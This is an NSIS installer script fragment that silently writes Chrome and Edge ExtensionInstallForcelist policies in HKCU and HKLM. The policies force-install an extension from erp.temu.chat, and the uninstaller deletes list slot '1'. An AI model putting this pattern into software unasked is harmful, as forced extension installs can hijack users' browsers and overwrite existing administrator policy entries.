!macro customInstall
  ; Use the 64-bit registry view for Chrome/Edge policy keys.
  SetRegView 64

  ; Chrome/Edge list policies use numeric value names: 1, 2, 3...
  ; Earlier builds used 9001, which is not the canonical list item name.
  DeleteRegValue HKCU "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "9001"
  DeleteRegValue HKCU "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "9001"
  WriteRegStr HKCU "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "1" "ejheeafceahglndenffjkcmojpiomcpg;https://erp.temu.chat/ext/update.xml"
  WriteRegStr HKCU "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "1" "ejheeafceahglndenffjkcmojpiomcpg;https://erp.temu.chat/ext/update.xml"

  ; HKLM writes need elevation. If unavailable, keep installation moving.
  ClearErrors
  DeleteRegValue HKLM "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "9001"
  WriteRegStr HKLM "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "1" "ejheeafceahglndenffjkcmojpiomcpg;https://erp.temu.chat/ext/update.xml"
  IfErrors 0 +2
    ClearErrors

  ClearErrors
  DeleteRegValue HKLM "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "9001"
  WriteRegStr HKLM "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "1" "ejheeafceahglndenffjkcmojpiomcpg;https://erp.temu.chat/ext/update.xml"
  IfErrors 0 +2
    ClearErrors

  SetRegView lastused
!macroend

!macro customUnInstall
  ; Use the 64-bit registry view and remove only our values.
  SetRegView 64

  DeleteRegValue HKCU "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "1"
  DeleteRegValue HKCU "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "1"
  DeleteRegValue HKCU "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "9001"
  DeleteRegValue HKCU "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "9001"

  ClearErrors
  DeleteRegValue HKLM "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "1"
  DeleteRegValue HKLM "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" "9001"
  IfErrors 0 +2
    ClearErrors

  ClearErrors
  DeleteRegValue HKLM "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "1"
  DeleteRegValue HKLM "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist" "9001"
  IfErrors 0 +2
    ClearErrors

  SetRegView lastused
!macroend
